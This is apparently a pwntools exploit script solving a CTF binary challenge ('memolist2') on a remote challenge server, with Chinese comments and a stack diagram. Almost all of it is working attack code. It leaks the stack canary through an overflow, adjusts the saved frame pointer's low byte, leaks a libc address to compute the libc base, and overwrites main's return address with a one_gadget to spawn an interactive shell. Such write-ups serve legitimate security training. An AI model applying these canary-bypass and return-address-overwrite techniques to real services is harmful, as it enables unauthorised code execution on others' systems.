# coding=utf-8
from pwn import *
context(arch = 'amd64', os = 'linux') 
while True :
    #r = process('./memolist2')
    r = remote('ctf.adl.tw', 11004)
    # EXPLOIT CODE GOES HERE

    # objdump -T libc.so.6 | grep __libc_start_main
    # 0000000000021ab0 g    DF .text  00000000000001be  GLIBC_2.2.5 __libc_start_main
    __libc_start_main_offset = 0x21ab0
    onegadgetOffset = 0x45216

    #寫入41個byte，因為canary的第一個byte一定是0x00，所以要蓋掉canary的第一個byte才能將canary完整的印出來
    #r.recvuntil('Enter one string:')
    print(r.recvuntil(b'===== String Concatenate =====\nEnter one string: \n'))
    r.send(b'1'*0x40)
    print(r.recvuntil(b'Enter another: \n'))
    #r.recvuntil('Enter another:')
    r.send(b'a'*0x40)
    print(r.recv())

    #印出canary和ebp的第一個bytes(同時也是ebp的最低位數)
    canary = r.recvline()
    ebpLowestByte = canary[8]   # 印出來的第九個byte就是ebp的第一個byte了
    canary = canary[:8]         # 前面8bytes是canary
    canary = u64(canary)        # unpack她
    canary = canary - 0x61      # 0x61是a的ascii碼，將canary的第一個byte(最低位數)設回0x00
    #print hex(canary)
    #print hex(ord(ebpLowestByte))

    #因為main function拿來放memo的local變數是存在stack裡面，而這個local變數開始的地方又比main function的return address低0x48個bytes
    #為了要印出main function的return address來算libc_base和改main function的return address，必須要將main的base往上移0x48個bytes
    #因為之後要將ebp的第一個byte加0x48之後放回去，所以要先確認加了0x48之後不會進位，要是會進位的話從頭來一次
    if ord(ebpLowestByte)+0x48 <= 255:
        break

#不要寫入，再重新輸入一次
r.recvuntil('1.yes, 2.no, 3.cancel : ')
r.send("2")
r.recvuntil('What do you want to write?\n')
    
#將canary和算好的ebp塞回去
r.send('a'*40+ p64(canary) + chr(ord(ebpLowestByte)+0x48))
r.recvuntil('1.yes, 2.no, 3.cancel : ')
r.send("1")

#印出retuen address(<__libc_start_main+240>)來算libc_base
r.recvuntil('choice :')
r.send('2')
r.recvuntil('Here is your memo: ')
__libc_start_main = r.recvuntil('\n')[:-1]      #不要最後的\n
__libc_start_main = __libc_start_main+(8-len(__libc_start_main))*'\0'   #用\0補到8bytes
__libc_start_main = u64(__libc_start_main)      #unpack她
__libc_start_main = __libc_start_main - 240     #扣掉240才是__libc_start_main的開始位置
#print hex(__libc_start_main)

#選1進入add_memo裡面寫入
#進入add_memo的時候會將main function存memo的local變數的位置傳進去，藉此就能改掉return address
r.recvuntil('choice :')
r.send('1')

#算onegadget位置
onegadget = __libc_start_main - __libc_start_main_offset + onegadgetOffset
onegadget = p64(onegadget)  #pack她

#將onegadget放入main function的return的地方，在將ebp的第一個byte設回本來的樣子
r.recvuntil('What do you want to write?\n')
r.send(onegadget+'a'*32+ p64(canary) + ebpLowestByte)

#回到main function
r.recvuntil('1.yes, 2.no, 3.cancel : ')
r.send("1")

#選exit，main function就會return
r.recvuntil('choice :')
r.send('4')
r.recvuntil('Goodbye~\n')

r.interactive()

'''stack的樣子
*                   輸入
*                   輸入
*                   輸入
*                   輸入
*                   輸入
* canary            輸入
* ebp               輸入第一個byte
* add_memo的return address
-----------------
* 
* 
* 輸入
* 輸入
* 輸入
* 輸入
* 輸入
* 輸入
* 輸入第一個byte
* canary
* ebp
* main function 的 return address   新輸入
*                                   新輸入
*                                   新輸入
*                                   新輸入
*                                   新輸入
*                                   新輸入
*                                   新輸入第一個byte
*                                   新carnary
*                                   新ebp(舊的ebp+0x48)
*                                   新main function 的 return address
*
*
*
'''